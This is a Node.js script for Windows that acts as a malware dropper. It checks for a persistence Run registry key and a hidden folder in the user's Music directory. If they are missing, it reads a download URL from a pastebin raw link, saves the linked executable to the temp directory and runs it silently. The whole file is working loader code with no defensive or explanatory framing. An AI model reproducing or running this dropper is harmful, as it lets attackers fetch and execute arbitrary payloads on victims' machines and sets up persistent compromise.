const path = require('path');
const fs = require('fs');
const os = require('os');
const https = require('https');
const http = require('http');

const { exec } = require('child_process');

const DEBUG = false;

const REG_PATH = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';

const HYPO_NAME = 'FOKEF';
const HYPO_IDEN = 'PVREM';
const HYPO_FOLDER = path.join(process.env.USERPROFILE, 'Music', `${HYPO_NAME}-${HYPO_IDEN}`);

const DOWNLOAD_URL = 'https://pastebin.com/raw/hEFujijY';

const debugPrint = (msg) => {
	if (DEBUG) console.log(msg);
}

const getRaw = (url, func) => {
	const protocol = url.startsWith('https') ? https : http;

	protocol.get(url, (res) => {
		if (res.statusCode !== 200) {
			func(null);
			return;
		}

		let data = '';
		res.on('data', chunk => data += chunk);
		res.on('end', () => func(data.trim()));
	}).on('error', () => {
		func(null);
	});
}

const download = (url, func) => {
	const protocol = url.startsWith('https') ? https : http;
	const filePath = path.join(os.tmpdir(), path.basename(url.split('?')[0]));
	const file = fs.createWriteStream(filePath);

	protocol.get(url, res => {
		if (res.statusCode !== 200) {
			file.close();
			fs.unlinkSync(filePath);

			func(null);
			return;
		}

		res.pipe(file);

		file.on('finish', () => {
			file.close();
			func(filePath);
		});
	}).on('error', () => {
		fs.unlink(filePath, () => func(null));
	});
}

const checkRegistry = () => {
	return new Promise(resolve => {
		exec(`reg query "${REG_PATH}" /v ${HYPO_NAME}`, (err, stdout) => {
			if (err || !stdout.includes(HYPO_NAME)) {
				debugPrint('[*] could not find reg key');
				resolve(false);
			} else {
				resolve(true);
			}
		});
	});
}

const checkFolder = () => {
	return new Promise((resolve) => {
		if (!fs.existsSync(HYPO_FOLDER)) {
			debugPrint('[*] could not find folder');
			return resolve(false);
		}

		exec(`attrib "${HYPO_FOLDER}"`, (err, stdout) => {
			if (err || !stdout.trim().startsWith('SH')) {
				debugPrint('[*] folder is not hidden');
				return resolve(false);
			}

			fs.readdir(HYPO_FOLDER, (err, files) => {
				if (err) return resolve(false);

				const exes = files.filter(f => f.endsWith('.exe'));
				if (exes.length !== 1) {
					debugPrint('[*] folder dosnt not have the correct number of files');
					return resolve(false);
				}

				resolve(true);
			});
		});
	});
}

(async () => {
	const registry = await checkRegistry();
	const folder = await checkFolder();

	if (registry && folder) {
		debugPrint('[*] skipping.');
		return;
	}

	debugPrint('[*] downloading...');

	getRaw(DOWNLOAD_URL, data => {
		if (!data) {
			debugPrint('[!] failed to get drop url');
			return;
		}

		debugPrint(`[*] drop url: ${data}`);

		download(data, filePath => {
			if (!filePath) {
				debugPrint('[!] failed to download');
				return;
			}

			debugPrint('[*] executing...');

			exec(`"${filePath}"`, (err, stdout, stderr) => {
				if (err) {
					debugPrint(`[!] failed to open: ${err.message}`);
					return;
				}

				if (stderr) debugPrint(`[!] stderr: ${stderr}`);
				if (stdout) debugPrint(`[*] stdout: ${stdout}`);
			});
		});
	});
})();
